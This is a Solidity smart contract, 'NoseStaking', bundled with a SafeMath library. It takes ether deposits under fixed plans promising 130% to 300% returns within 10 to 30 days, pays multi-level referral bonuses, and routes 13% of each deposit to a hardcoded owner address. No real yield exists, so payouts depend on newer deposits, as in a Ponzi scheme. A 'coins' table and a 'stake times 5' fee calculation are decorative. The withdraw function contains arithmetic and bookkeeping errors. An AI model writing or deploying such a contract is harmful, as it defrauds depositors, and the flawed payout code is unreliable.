// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;


// CAUTION
// This version of SafeMath should only be used with Solidity 0.8 or later,
// because it relies on the compiler's built in overflow checks.

/**
 * @dev Wrappers over Solidity's arithmetic operations.
 *
 * NOTE: `SafeMath` is generally not needed starting with Solidity 0.8, since the compiler
 * now has built in overflow checking.
 */
library SafeMath {
    /**
     * @dev Returns the addition of two unsigned integers, with an overflow flag.
     *
     * _Available since v3.4._
     */
    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            uint256 c = a + b;
            if (c < a) return (false, 0);
            return (true, c);
        }
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, with an overflow flag.
     *
     * _Available since v3.4._
     */
    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b > a) return (false, 0);
            return (true, a - b);
        }
    }

    /**
     * @dev Returns the multiplication of two unsigned integers, with an overflow flag.
     *
     * _Available since v3.4._
     */
    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
            // benefit is lost if 'b' is also tested.
            // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
            if (a == 0) return (true, 0);
            uint256 c = a * b;
            if (c / a != b) return (false, 0);
            return (true, c);
        }
    }

    /**
     * @dev Returns the division of two unsigned integers, with a division by zero flag.
     *
     * _Available since v3.4._
     */
    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a / b);
        }
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers, with a division by zero flag.
     *
     * _Available since v3.4._
     */
    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a % b);
        }
    }

    /**
     * @dev Returns the addition of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `+` operator.
     *
     * Requirements:
     *
     * - Addition cannot overflow.
     */
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    /**
     * @dev Returns the multiplication of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `*` operator.
     *
     * Requirements:
     *
     * - Multiplication cannot overflow.
     */
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    /**
     * @dev Returns the integer division of two unsigned integers, reverting on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator.
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * reverting when dividing by zero.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on
     * overflow (when the result is negative).
     *
     * CAUTION: This function is deprecated because it requires allocating memory for the error
     * message unnecessarily. For custom revert reasons use {trySub}.
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }

    /**
     * @dev Returns the integer division of two unsigned integers, reverting with custom message on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * reverting with custom message when dividing by zero.
     *
     * CAUTION: This function is deprecated because it requires allocating memory for the error
     * message unnecessarily. For custom revert reasons use {tryMod}.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }
}


struct Tarif {
  uint8 life_days;
  uint256 percent;
}

struct Deposit {
  uint8 tarif;
  uint256 amount;
  uint40 time;
}

struct Withdraw {
  uint256 amount;
  uint40 time;
}

struct Coin {
    string name;
    string symbol;
    string chain;
    address addr;
    uint256 staked_value;
    uint8 users;
    string country;
    uint256 fee;
}

struct Player {
  address upline;
  uint256 dividends;
  uint256 match_bonus;
  uint40 last_payout;
  uint256 total_invested;
  uint256 total_withdrawn;
  uint256 total_match_bonus;
  Deposit[] deposits;
  Withdraw[] withdraws;
  uint256[3] structure;
}

contract NoseStaking {
    using SafeMath for uint;

    address public owner = 0xe33Aa4F7C9F0a7871A8ab443355cCEcf6fa06000;

    bool public tradeOn;
    
    uint256 public invested;
    uint256 public withdrawn;
    uint256 public match_bonus;
    
    uint8 constant BONUS_LINES_COUNT = 3;
    uint16 constant PERCENT_DIVIDER = 1000; 
    uint8[BONUS_LINES_COUNT] public ref_bonuses = [50, 30, 20]; 

    uint constant WITHDRAW_COOLDOWN = 1 days; // claim 1 times per day

    uint256 public minDepositAmount = 0.1 ether;
    uint256 public maxWithdrawAmount = 50 ether;

    uint8 private coins_length;

    uint256 public deposit_fee = 13;

    mapping(uint8 => Tarif) public tarifs;
    mapping(address => Player) public players;
    mapping(uint8 => Coin) public coins;

    event Upline(address indexed addr, address indexed upline, uint256 bonus);
    event NewDeposit(address indexed addr, uint256 amount, uint8 tarif);
    event MatchPayout(address indexed addr, address indexed from, uint256 amount);
    event NewWithdraw(address indexed addr, uint256 amount, uint256 date, uint256 last_payout);

    constructor() {
        tradeOn = true;

        coins[0] = Coin("Ethereum", "ETH", "EthereumChain", 0x0000000000000000000000000000000000000000, 0, 0, "USA", 10000);
        coins[1] = Coin("USD token", "USDT", "TetherChain", 0x55d398326f99059fF775485246999027B3197955, 0, 0, "USA", 10000);
        coins[2] = Coin("Binance coin", "BNB", "BNBChain", 0x0000000000000000000000000000000000000000, 0, 0, "USA", 10000);
        coins[3] = Coin("CTC token", "CTC(TM)", "CyberTronChain", 0xF59Af0c74d3148247339c479bEF4261c3645c73f, 0, 0, "USA", 50000);

        coins_length=4;

        tarifs[10] = Tarif(10, 130);
        tarifs[11] = Tarif(11, 141);
        tarifs[12] = Tarif(12, 152);
        tarifs[13] = Tarif(13, 163);
        tarifs[14] = Tarif(14, 173);
        tarifs[15] = Tarif(15, 183);
        tarifs[16] = Tarif(16, 193);
        tarifs[17] = Tarif(17, 203);
        tarifs[18] = Tarif(18, 212);
        tarifs[19] = Tarif(19, 221);
        tarifs[20] = Tarif(20, 230);
        tarifs[21] = Tarif(21, 238);
        tarifs[22] = Tarif(22, 246);
        tarifs[23] = Tarif(23, 254);
        tarifs[24] = Tarif(24, 261);
        tarifs[25] = Tarif(25, 268);
        tarifs[26] = Tarif(26, 275);
        tarifs[27] = Tarif(27, 282);
        tarifs[28] = Tarif(28, 288);
        tarifs[29] = Tarif(29, 294);
        tarifs[30] = Tarif(30, 300);
    }

    function setTradeOn(bool _tradeStatus) public {
        require(msg.sender == owner, "You must be owner");
        tradeOn = _tradeStatus;
    }

    function transferOwnership(address _owner) public {
        require(msg.sender == owner, "You must be owner");
        owner = _owner;
    }

    function _payout(address _addr) private {
        uint256 payout = this.payoutOf(_addr);

        if(payout > 0) {
            players[_addr].last_payout = uint40(block.timestamp);
            players[_addr].dividends += payout;
        }
    }

    function _refPayout(address _addr, uint256 _amount) private {
        address up = players[_addr].upline;

        for(uint8 i = 0; i < ref_bonuses.length; i++) {
            if(up == address(0)) break;
            
            uint256 bonus = _amount * ref_bonuses[i] / PERCENT_DIVIDER;
            
            players[up].match_bonus += bonus;
            players[up].total_match_bonus += bonus;

            match_bonus += bonus;

            emit MatchPayout(up, _addr, bonus);

            up = players[up].upline;
        }
    }

    function _setUpline(address _addr, address _upline, uint256 _amount) private {

        if(players[_addr].upline == address(0) && _addr != owner) {
            if(players[_upline].deposits.length == 0) {
                _upline = owner;
            }

            players[_addr].upline = _upline;

            emit Upline(_addr, _upline, _amount / 100);
            
            for(uint8 i = 0; i < BONUS_LINES_COUNT; i++) {
                players[_upline].structure[i]++;

                _upline = players[_upline].upline;

                if(_upline == address(0)) break;
            }
        }
    }
    
    function deposit(uint8 _tarif, address _upline) external payable {
        require(tradeOn == true, "Project is not launched");
        require(tarifs[_tarif].life_days > 0, "Tarif not found");
        require(msg.value >= minDepositAmount, "You can't deposit less than Minimum deposit amount");

        Player storage player = players[msg.sender];

        require(player.deposits.length < 100, "Max 100 deposits per address");

        _setUpline(msg.sender, _upline, msg.value);

        player.deposits.push(Deposit({
            tarif: _tarif,
            amount: msg.value,
            time: uint40(block.timestamp)
        }));

        player.total_invested += msg.value;
        invested += msg.value;

        _refPayout(msg.sender, msg.value);
        
        payable(owner).transfer(msg.value * deposit_fee / 100);

        emit NewDeposit(msg.sender, msg.value, _tarif);
    }
    
    function withdraw() external {
        Player storage player = players[msg.sender];

        require(block.timestamp - player.last_payout >= WITHDRAW_COOLDOWN, "You can't withdraw more then 1 times in a day.");

        _payout(msg.sender);

        require(player.dividends > 0 || player.match_bonus > 0, "Zero amount");

        uint256 amount = player.dividends + player.match_bonus;

        uint256 withdrawAmount = amount;

        if(amount > maxWithdrawAmount) {
            withdrawAmount = maxWithdrawAmount;
            
            if(player.match_bonus > maxWithdrawAmount) {
                player.match_bonus -= withdrawAmount;
            }
            else {
                player.match_bonus = 0;
                player.dividends -= (maxWithdrawAmount - player.match_bonus);
            }
        }
        else {
            player.dividends = 0;
            player.total_withdrawn = 0;
        }
        
        withdrawn += withdrawAmount;
        
        player.withdraws.push(Withdraw({
            amount: withdrawAmount,
            time: uint40(block.timestamp)
        }));

        payable(msg.sender).transfer(withdrawAmount);
                
        emit NewWithdraw(msg.sender, withdrawAmount, block.timestamp, player.last_payout);
    }

    function payoutOf(address _addr) view external returns(uint256 value) {
        Player storage player = players[_addr];

        for(uint256 i = 0; i < player.deposits.length; i++) {
            Deposit storage dep = player.deposits[i];
            Tarif storage tarif = tarifs[dep.tarif];

            uint40 time_end = dep.time + tarif.life_days * 86400;
            uint40 from = player.last_payout > dep.time ? player.last_payout : dep.time;
            uint40 to = block.timestamp > time_end ? time_end : uint40(block.timestamp);
            
            if(from < to) {
                value += dep.amount.mul(to - from).mul(tarif.percent).div(100).div(86400).div(tarif.life_days);
            }
        }

        return value;
    }

    function currentTime() view external returns(uint256 timestamp) {
        return block.timestamp;
    }

    function coinsInfo_length() view external returns(uint8) {  
        return coins_length;
    } 

    function memcmp(bytes memory a, bytes memory b) internal pure returns(bool){
        return (a.length == b.length) && (keccak256(a) == keccak256(b));
    }

    function strcmp(string memory a, string memory b) internal pure returns(bool){
        return memcmp(bytes(a), bytes(b));
    }

    function coinsInfoBySymbol(string memory tsymbol) view external returns(string memory name, string memory symbol, string memory chain, address addr, uint256 staked_value, uint8 users, string memory country, uint256 fee) {
        uint8 _index=coins_length;
        for (uint8 i=0;i<coins_length;i++) {
            if (strcmp(coins[i].symbol,tsymbol)==true) {
                _index=i;
                break;
            }
        }
        Coin storage coin = coins[_index];
        return (coin.name, coin.symbol, coin.chain, coin.addr, coin.staked_value, coin.users, coin.country, coin.fee);
    }

    function coinsInfo(uint8 _index) view external returns(string memory name, string memory symbol, string memory chain, address addr, uint256 staked_value, uint8 users, string memory country, uint256 fee) {
        Coin storage coin = coins[_index];
        return (coin.name, coin.symbol, coin.chain, coin.addr, coin.staked_value, coin.users, coin.country, coin.fee);
    }
    
    function userInfo(address _addr) view external returns(uint256 for_withdraw, uint256 total_invested, uint256 total_withdrawn, uint256 total_match_bonus, uint256 last_payout, uint256 player_match_bonus, Deposit[] memory deposits, Withdraw[] memory withdraws, uint256[BONUS_LINES_COUNT] memory structure) {
        Player storage player = players[_addr];

        uint256 payout = this.payoutOf(_addr);

        for(uint8 i = 0; i < ref_bonuses.length; i++) {
            structure[i] = player.structure[i];
        }

        return (
            payout + player.dividends + player.match_bonus,
            player.total_invested,
            player.total_withdrawn,
            player.total_match_bonus,
            player.last_payout,
            player.match_bonus,
            player.deposits,
            player.withdraws,
            structure
        );
    }

    function contractInfo() view external returns(uint256 _invested, uint256 _withdrawn, uint256 _match_bonus) {
        return (invested, withdrawn, match_bonus);
    }

    function calcFee(uint8 _index, uint256 stake_amount) view external returns(uint256 stake_val, uint256 fee) {
        fee=coins[_index].fee;
        stake_val=stake_amount*5;
        return (stake_val, fee);
    }
    
    function calcFeeBySimbol(string memory tsymbol, uint256 stake_amount) view external returns(uint256 stake_val, uint256 fee) {
        uint8 _index=coins_length;
        for (uint8 i=0;i<coins_length;i++) {
            if (strcmp(coins[i].symbol,tsymbol)==true) {
                _index=i;
                break;
            }
        }
        fee=coins[_index].fee;
        stake_val=stake_amount*5;
        return (stake_val, fee);
    }
}